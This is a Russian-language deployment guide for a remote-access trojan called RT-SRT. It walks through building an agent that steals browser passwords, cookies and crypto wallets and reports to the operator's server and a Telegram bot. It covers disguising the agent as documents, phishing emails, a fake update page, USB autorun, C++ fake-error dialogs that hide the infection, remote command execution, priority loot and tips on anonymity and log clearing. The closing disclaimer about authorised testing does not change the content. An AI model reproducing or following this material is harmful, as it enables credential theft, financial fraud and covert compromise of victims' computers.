# 🎯 RT-SRT Deployment Guide - Полная инструкция для чайников

## 📋 Что это такое?

**RT-SRT** - это система для получения удаленного доступа к компьютерам через социальную инженерию.

### 🔄 Как это работает:
1. **Вы собираете агент** - небольшой файл (~50-150KB)
2. **Доставляете его цели** - через email, USB, поддельный сайт и т.д.
3. **Цель запускает файл** - думая что это документ/программа
4. **Агент подключается к вам** - и вы получаете доступ к их системе
5. **Собираете данные** - пароли, криптокошельки, файлы и т.д.

---

## 🖥️ Часть 1: Настройка системы (ВАШ компьютер)

### 🍎 Настройка на macOS

#### 1.1 Установка зависимостей
```bash
# Установить Homebrew (если нет)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Установить необходимые компоненты
brew install cmake git python3 upx

# Проверить установку
cmake --version
python3 --version
git --version
upx --version
```

#### 1.2 Клонирование проекта
```bash
# Клонировать проект
git clone https://github.com/your-repo/RT-SRT.git
cd RT-SRT

# Дать права на выполнение скриптов
chmod +x scripts/*.sh
```

#### 1.3 Настройка сервера (macOS)
```bash
# Перейти в папку сервера
cd server

# Создать виртуальное окружение Python
python3 -m venv venv
source venv/bin/activate

# Установить зависимости
pip install --upgrade pip
pip install -r requirements.txt

# Настроить конфигурацию
cp .env.example .env

# Отредактировать .env (замените значения)
nano .env
```

### 🪟 Настройка на Windows

#### 1.1 Установка зависимостей
```cmd
# 1. Скачать и установить Visual Studio Community 2019+
#    https://visualstudio.microsoft.com/downloads/
#    При установке выбрать "C++ desktop development"

# 2. Скачать и установить CMake
#    https://cmake.org/download/
#    Добавить в PATH при установке

# 3. Скачать и установить Git
#    https://git-scm.com/download/win

# 4. Скачать и установить Python 3.8+
#    https://www.python.org/downloads/
#    Обязательно поставить галочку "Add to PATH"

# 5. Скачать UPX (опционально)
#    https://upx.github.io/
#    Распаковать в C:\upx\ и добавить в PATH

# Проверить установку в Command Prompt
cmake --version
python --version
git --version
cl.exe   # Должен найти компилятор Visual Studio
```

#### 1.2 Клонирование проекта (Windows)
```cmd
# Открыть Command Prompt или PowerShell
# Клонировать проект
git clone https://github.com/your-repo/RT-SRT.git
cd RT-SRT
```

#### 1.3 Настройка сервера (Windows)
```cmd
# Перейти в папку сервера
cd server

# Создать виртуальное окружение Python
python -m venv venv
venv\Scripts\activate

# Установить зависимости
pip install --upgrade pip
pip install -r requirements.txt

# Настроить конфигурацию
copy .env.example .env

# Отредактировать .env (используйте Notepad++)
notepad .env
```

---

## ⚙️ Часть 2: Конфигурация системы

### 2.1 Настройка .env файла (ОЧЕНЬ ВАЖНО!)
```bash
# Откройте server/.env и настройте:

# Ваш IP адрес или домен (куда агент будет подключаться)
SERVER_HOST=192.168.1.100  # Замените на ваш реальный IP
SERVER_PORT=8000

# Секретные ключи (сгенерируйте новые!)
SECRET_KEY=ваш-супер-секретный-ключ-32-символа-минимум
AES_KEY=ваш-aes-ключ-ровно-32-символа

# Telegram бот (опционально)
TELEGRAM_BOT_TOKEN=your-telegram-bot-token
TELEGRAM_ALLOWED_USERS=123456789,987654321

# База данных
DATABASE_URL=sqlite:///./rt_srt.db

# Логирование
DEBUG=False
LOG_LEVEL=INFO
```

### 2.2 Настройка агента для подключения к вашему серверу
```cpp
// Отредактируйте agent/src/main.cpp
// Найдите эти строки (примерно строка 80-82):

namespace Config {
    constexpr const char* PRIMARY_HOST = "192.168.1.100:8000";  // Ваш IP:порт
    constexpr const char* BACKUP_HOST = "backup-server.com:8000";
    constexpr const char* TELEGRAM_BOT_URL = "https://api.telegram.org/bot{token}/sendDocument";
}

// Замените 192.168.1.100 на ваш реальный IP адрес!
// Если у вас есть домен, используйте его: "mydomain.com:8000"
```

### 2.3 Настройка поддельных сообщений для цели
```cpp
// В том же файле agent/src/main.cpp найдите или добавьте:

namespace DeceptionConfig {
    // Включить показ поддельных сообщений после установки
    constexpr bool SHOW_FAKE_ERROR = true;
    
    // Варианты сообщений (выберите одно или добавьте свое)
    constexpr const char* FAKE_MESSAGES[] = {
        "Файл поврежден. Обратитесь в службу поддержки: support@company.com",
        "Ваш регион не поддерживается. Попробуйте позже.",
        "Обновление завершено. Перезагрузите компьютер.",
        "Установка прервана. Недостаточно места на диске.",
        "Лицензия истекла. Обратитесь к администратору.",
        "Проверка целостности не пройдена. Файл может быть поврежден."
    };
    
    // Заголовок окна
    constexpr const char* ERROR_TITLE = "Ошибка установки";
    
    // Задержка перед показом сообщения (секунды)
    constexpr int DELAY_BEFORE_MESSAGE = 3;
}
```

---

## 🔨 Часть 3: Сборка агента

### 3.1 Автоматическая сборка (рекомендуется)

#### macOS:
```bash
cd /path/to/RT-SRT

# Полная автоматическая сборка
./scripts/build.sh Release

# Результат будет в:
ls -la dist/rt_srt_agent
```

#### Windows:
```cmd
cd C:\path\to\RT-SRT

# Полная автоматическая сборка
scripts\build.bat Release

REM Или используйте PowerShell:
REM powershell -ExecutionPolicy Bypass -File scripts\build.ps1

REM Результат будет в:
dir dist\rt_srt_agent.exe
```

### 3.2 Ручная сборка (если автоматическая не работает)

#### macOS/Linux:
```bash
cd RT-SRT

# Создать папку для сборки
mkdir -p build && cd build

# Настроить CMake
cmake .. -DCMAKE_BUILD_TYPE=Release \
         -DENABLE_NETWORK_MODULE=ON \
         -DENABLE_STEALTH_MODULE=ON \
         -DENABLE_PERSISTENCE_MODULE=ON \
         -DENABLE_BROWSER_MODULE=ON \
         -DENABLE_CRYPTO_MODULE=ON \
         -DBUILD_AS_EXE=ON

# Собрать
cmake --build . --parallel --target rt_srt_agent

# Сжать (если установлен UPX)
cmake --build . --target pack_agent

# Результат:
ls -la build/build/rt_srt_agent
```

#### Windows:
```cmd
cd RT-SRT

REM Создать папку для сборки
mkdir build
cd build

REM Настроить CMake (используйте Visual Studio)
cmake .. -G "Visual Studio 16 2019" -A x64 ^
         -DCMAKE_BUILD_TYPE=Release ^
         -DENABLE_NETWORK_MODULE=ON ^
         -DENABLE_STEALTH_MODULE=ON ^
         -DENABLE_PERSISTENCE_MODULE=ON ^
         -DENABLE_BROWSER_MODULE=ON ^
         -DENABLE_CRYPTO_MODULE=ON ^
         -DBUILD_AS_EXE=ON

REM Собрать
cmake --build . --config Release --target rt_srt_agent

REM Сжать (если установлен UPX)
cmake --build . --target pack_agent

REM Результат:
dir build\Release\rt_srt_agent.exe
```

### 3.3 Проверка результата сборки
```bash
# Проверить размер файла (должен быть 50-150KB после UPX)
ls -lh dist/rt_srt_agent          # macOS/Linux
dir dist\rt_srt_agent.exe         # Windows

# Проверить что файл исполняемый
file dist/rt_srt_agent             # macOS/Linux
```

---

## 🖥️ Часть 4: Запуск вашего сервера

### 4.1 Запуск сервера управления

#### macOS/Linux:
```bash
cd RT-SRT/server

# Активировать Python окружение
source venv/bin/activate

# Запустить сервер
python src/web_panel/app.py

# Или через uvicorn для production
uvicorn src.web_panel.app:app --host 0.0.0.0 --port 8000
```

#### Windows:
```cmd
cd RT-SRT\server

REM Активировать Python окружение
venv\Scripts\activate

REM Запустить сервер
python src\web_panel\app.py

REM Или через uvicorn для production
uvicorn src.web_panel.app:app --host 0.0.0.0 --port 8000
```

### 4.2 Проверка работы сервера
```bash
# Открыть браузер и перейти на:
http://localhost:8000

# Или проверить через curl:
curl http://localhost:8000/api/health

# Должен вернуть:
{"status": "healthy", "version": "1.0.0"}
```

### 4.3 Доступ к панели управления
```
URL: http://localhost:8000
Логин: admin
Пароль: changeme

⚠️ ВАЖНО: Смените пароль после первого входа!
```

---

## 🎯 Часть 5: Подготовка агента для доставки

### 5.1 Маскировка агента
```bash
# Переименовать агент чтобы выглядел безопасно
cp dist/rt_srt_agent "Важный документ.pdf.exe"
cp dist/rt_srt_agent "Счет на оплату.docx.exe"  
cp dist/rt_srt_agent "Обновление системы.exe"
cp dist/rt_srt_agent "Фотографии отпуска.exe"

# Изменить иконку (Windows)
# Используйте Resource Hacker или подобные инструменты
```

### 5.2 Создание архива с паролем (рекомендуется)
```bash
# Создать ZIP архив с паролем
zip -P infected "Документы.zip" "Важный документ.pdf.exe"

# Или 7-Zip (Windows)
7z a -pinfected "Документы.7z" "Важный документ.pdf.exe"

# Пароль "infected" объясните цели в письме:
# "Файл защищен паролем: infected"
```

### 5.3 Создание README для цели
```text
# Создайте файл README.txt рядом с агентом:

ВАЖНЫЕ ДОКУМЕНТЫ
================

Для просмотра документов:
1. Распакуйте архив паролем: infected
2. Запустите файл "Важный документ.pdf.exe"
3. Дождитесь открытия документа

При возникновении проблем обращайтесь:
support@company.com

С уважением,
Служба документооборота
```

---

## 📧 Часть 6: Методы доставки агента

### 6.1 Email доставка
```
Тема: Важные документы для подписи
Текст: Добрый день! Высылаю документы для ознакомления и подписи.
       Пароль для архива: infected
       
Вложение: Документы.zip (содержит замаскированный агент)

Отправитель: noreply@company.com
```

### 6.2 Поддельный сайт
```html
<!-- Создайте простую страницу скачивания -->
<!DOCTYPE html>
<html>
<head>
    <title>Скачать обновление</title>
</head>
<body>
    <h1>Критическое обновление безопасности</h1>
    <p>Обнаружена критическая уязвимость. Немедленно установите обновление.</p>
    <a href="/download/security-update.exe" download>
        <button>Скачать обновление (1.2MB)</button>
    </a>
</body>
</html>
```

### 6.3 USB/флешка
```bash
# Скопировать агент на флешку
cp "Обновление системы.exe" /media/usb/
echo "Autorun файл" > /media/usb/autorun.inf

# Содержимое autorun.inf:
[autorun]
open=Обновление системы.exe
icon=setup.ico
label=Обновление Windows
```

---

## 🎭 Часть 7: Добавление поддельных сообщений

### 7.1 Реализация функции показа ошибок
```cpp
// Добавьте в agent/src/main.cpp после инициализации агента:

#include <windows.h>
#include <string>
#include <random>

namespace Deception {
    void ShowFakeError() {
        // Массив возможных сообщений
        std::vector<std::string> messages = {
            "Файл поврежден или содержит ошибки.\n\nОбратитесь в службу поддержки:\nsupport@company-help.com\n\nКод ошибки: 0x80070002",
            "Ваш регион не поддерживается данной версией.\n\nПопробуйте скачать региональную версию\nс официального сайта позже.",
            "Установка завершена успешно.\n\nНекоторые изменения вступят в силу\nпосле перезагрузки компьютера.",
            "Недостаточно места на диске для установки.\n\nОсвободите минимум 50 МБ свободного места\nи попробуйте снова.",
            "Срок действия лицензии истек.\n\nОбратитесь к системному администратору\nдля продления лицензии.\n\nТелефон: +7 (495) 123-45-67",
            "Файл не прошел проверку цифровой подписи.\n\nВозможно файл был поврежден при скачивании.\nПопробуйте скачать заново.",
            "Обновление системы завершено.\n\nВнесены критические исправления безопасности.\nРекомендуется перезагрузка.",
            "Ошибка подключения к серверу лицензий.\n\nПроверьте подключение к интернету\nи попробуйте позже."
        };
        
        std::vector<std::string> titles = {
            "Ошибка установки",
            "Ошибка запуска",
            "Системное сообщение", 
            "Microsoft Windows",
            "Служба лицензирования",
            "Центр обновления Windows",
            "Антивирус"
        };
        
        // Случайно выбираем сообщение
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> msgDis(0, messages.size() - 1);
        std::uniform_int_distribution<> titleDis(0, titles.size() - 1);
        
        std::string message = messages[msgDis(gen)];
        std::string title = titles[titleDis(gen)];
        
        // Показываем сообщение с задержкой
        Sleep(3000);  // 3 секунды после запуска
        
        MessageBoxA(nullptr, message.c_str(), title.c_str(), 
                    MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
    }
    
    void ShowFakeSuccess() {
        std::vector<std::string> successMessages = {
            "Установка завершена успешно!\n\nПрограмма готова к использованию.",
            "Обновление установлено.\n\nВсе компоненты обновлены до последней версии.",
            "Регистрация прошла успешно.\n\nТеперь вы можете пользоваться полной версией.",
            "Файлы успешно распакованы.\n\nВы можете найти их в папке 'Документы'."
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, successMessages.size() - 1);
        
        Sleep(2000);
        MessageBoxA(nullptr, successMessages[dis(gen)].c_str(), 
                   "Успешно", MB_OK | MB_ICONINFORMATION);
    }
}

// В функции main() или WinMain() добавьте:
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Скрыть консоль
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Запустить агент в фоне
    std::thread agentThread([]() {
        g_agent = std::make_unique<Agent>();
        if (g_agent->Initialize()) {
            g_agent->Start();
        }
    });
    agentThread.detach();
    
    // Показать поддельное сообщение пользователю
    #ifdef ENABLE_FAKE_MESSAGES
    // Случайно выбираем тип сообщения
    if (rand() % 100 < 70) {  // 70% ошибок, 30% успехов
        Deception::ShowFakeError();
    } else {
        Deception::ShowFakeSuccess();
    }
    #endif
    
    // Продолжить работу агента в фоне
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}
```

### 7.2 Включение поддельных сообщений при сборке
```bash
# При сборке добавьте флаг:
cmake .. -DCMAKE_BUILD_TYPE=Release \
         -DENABLE_FAKE_MESSAGES=ON \
         -DENABLE_NETWORK_MODULE=ON \
         # ... другие флаги
```

---

## 📊 Часть 8: Мониторинг подключений

### 8.1 Что вы увидите при подключении агента
```
В веб-панели http://localhost:8000:

📱 Новое подключение:
   - IP адрес: 192.168.1.105
   - Имя компьютера: DESKTOP-ABC123
   - Пользователь: John_Smith
   - Операционная система: Windows 10 Pro
   - Время подключения: 2024-05-30 15:42:13

📊 Системная информация:
   - Процессор: Intel Core i5-8400
   - Память: 8 GB
   - Диски: C:\ (500 GB), D:\ (1 TB)
   - Антивирус: Windows Defender

🔍 Собранные данные:
   - Пароли браузеров: 47 записей
   - Cookie файлы: 1,250 записей  
   - Криптокошельки: MetaMask найден
   - История браузера: 5 дней
   - Закладки: 89 записей
```

### 8.2 Команды для управления агентом
```
Через веб-панель можете отправить команды:

📋 Информационные:
   - system_info - подробная информация о системе
   - network_info - сетевые подключения
   - process_list - список процессов
   - installed_software - установленные программы

💾 Сбор данных:
   - collect_browser_data - собрать данные браузеров
   - collect_crypto_data - найти криптокошельки
   - collect_files - найти интересные файлы
   - take_screenshot - сделать скриншот

🎮 Управление:
   - execute_command - выполнить команду CMD
   - download_file - скачать файл с компьютера
   - upload_file - загрузить файл на компьютер
   - restart_agent - перезапустить агент
```

---

## 🚨 Часть 9: Меры предосторожности

### 9.1 Безопасность вашего сервера
```bash
# Используйте VPN или анонимный сервер
# Настройте файрвол
sudo ufw allow 8000/tcp
sudo ufw enable

# Используйте SSL сертификаты
# Смените все пароли по умолчанию
# Регулярно очищайте логи
```

### 9.2 Анонимность
```
✅ Используйте VPN при управлении сервером
✅ Регистрируйте домены через анонимные сервисы
✅ Используйте временные email адреса
✅ Не храните данные на основном компьютере
✅ Используйте виртуальные машины
```

### 9.3 Что делать после получения доступа
```
🎯 Приоритетные данные:
   - Пароли и логины
   - Криптокошельки и приватные ключи  
   - Банковские данные
   - Личные документы и фото
   - Корпоративная информация

💾 Как сохранять:
   - Экспортировать через веб-панель
   - Автоматическое сохранение в базу
   - Отправка на Telegram бот
   - Backup на внешние диски
```

---

## 🎉 Часть 10: Заключение

### ✅ Чек-лист готовности системы:
- [ ] Сервер собран и запущен на вашем IP
- [ ] Агент собран с правильным IP сервера  
- [ ] Агент замаскирован под безопасный файл
- [ ] Метод доставки выбран и подготовлен
- [ ] Поддельные сообщения настроены
- [ ] Веб-панель доступна и работает
- [ ] VPN/анонимность настроены

### 🎯 Ожидаемый результат:
1. **Цель получает файл** - через email/USB/сайт
2. **Запускает агент** - думая что это документ/программа
3. **Видит поддельное сообщение** - "файл поврежден" или "установка завершена"
4. **Агент работает в фоне** - незаметно для пользователя
5. **Вы получаете доступ** - видите все данные в веб-панели

### 🔧 При проблемах:
```
❌ Агент не подключается:
   - Проверьте IP адрес в конфигурации
   - Убедитесь что сервер запущен
   - Проверьте файрвол и порты

❌ Ошибки сборки:
   - Проверьте установленные компоненты
   - Попробуйте пересобрать с нуля
   - Проверьте логи сборки

❌ Сервер не запускается:
   - Проверьте .env конфигурацию
   - Установите Python зависимости
   - Проверьте права доступа к файлам
```

**Система готова к использованию! Удачной охоты! 🎯**

---

## ⚖️ Правовая информация

⚠️ **ВНИМАНИЕ**: Данный инструмент предназначен ТОЛЬКО для:
- Авторизованного тестирования безопасности
- Образовательных целей  
- Исследования в области кибербезопасности

Несанкционированное использование ЗАПРЕЩЕНО и может повлечь уголовную ответственность!